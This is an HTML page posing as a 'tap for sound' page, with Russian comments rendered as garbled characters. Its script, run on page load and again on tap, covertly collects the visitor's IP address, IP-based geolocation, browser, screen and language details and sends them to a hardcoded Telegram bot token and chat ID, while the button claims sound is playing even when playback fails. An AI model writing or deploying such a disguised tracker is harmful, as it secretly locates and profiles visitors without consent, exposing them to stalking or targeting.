<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
            text-align: center;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
        .message {
            font-size: 18px;
            margin-bottom: 20px;
            color: #ffeb3b;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <button id="playButton">
        <div class="message">–ù–∞–∂–º–∏ –¥–ª—è –∑–≤—É–∫–∞ üéµ</div>
        TAP FOR SOUND
    </button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è Telegram –±–æ—Ç–∞ (–ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ò)
        const TELEGRAM_BOT_TOKEN = '8418449495:AAH_5D00nSETqgK50hC3swZKC3hlXj9qkSQ'; // –¢–æ–∫–µ–Ω –±–æ—Ç–∞
        const TELEGRAM_CHAT_ID = '1019756213'; // –¢–≤–æ–π ID –≤ Telegram

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–ó–≤—É–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç! üîä</div>
                    SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = `
                    <div class="message">–ó–≤—É–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç! üîä</div>
                    SOUND PLAYING!
                `;
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP
        async function getLocationByIP(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    city: data.city,
                    country: data.country_name,
                    region: data.region,
                    org: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                return null;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.log('Telegram error:', error);
                return null;
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendData() {
            statusDiv.innerHTML = 'üì° –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ...';
            
            const ip = await getIP();
            const location = await getLocationByIP(ip);
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            let message = `üö® <b>–ù–æ–≤—ã–π –≤–∏–∑–∏—Ç</b>\n\n`;
            message += `üì± <b>IP:</b> <code>${ip}</code>\n`;
            message += `‚è∞ <b>–í—Ä–µ–º—è:</b> ${new Date().toLocaleString()}\n`;
            
            if (location) {
                message += `üìç <b>–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</b>\n`;
                message += `   üåç <b>–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</b> ${location.latitude}, ${location.longitude}\n`;
                message += `   üèôÔ∏è <b>–ì–æ—Ä–æ–¥:</b> ${location.city}\n`;
                message += `   üá∑üá∫ <b>–°—Ç—Ä–∞–Ω–∞:</b> ${location.country}\n`;
                message += `   üè¢ <b>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</b> ${location.org}\n`;
            }
            
            message += `\nüíª <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${navigator.userAgent}\n`;
            message += `üìè <b>–≠–∫—Ä–∞–Ω:</b> ${screen.width}x${screen.height}\n`;
            message += `üåê <b>–Ø–∑—ã–∫:</b> ${navigator.language}\n`;
            message += `üîó <b>–°—Å—ã–ª–∫–∞:</b> ${window.location.href}`;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            const result = await sendToTelegram(message);
            
            if (result && result.ok) {
                statusDiv.innerHTML = '‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!';
            } else {
                statusDiv.innerHTML = 'üì® –î–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã (–æ—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏)';
            }

            return { ip, location };
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞
        document.getElementById('playButton').addEventListener('click', async function() {
            // –°—Ä–∞–∑—É –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
            playSound();
            
            // –°–æ–±–∏—Ä–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            await collectAndSendData();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            this.click();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', async function() {
            setTimeout(async () => {
                await collectAndSendData();
            }, 1000);
        });
    </script>
</body>
</html>
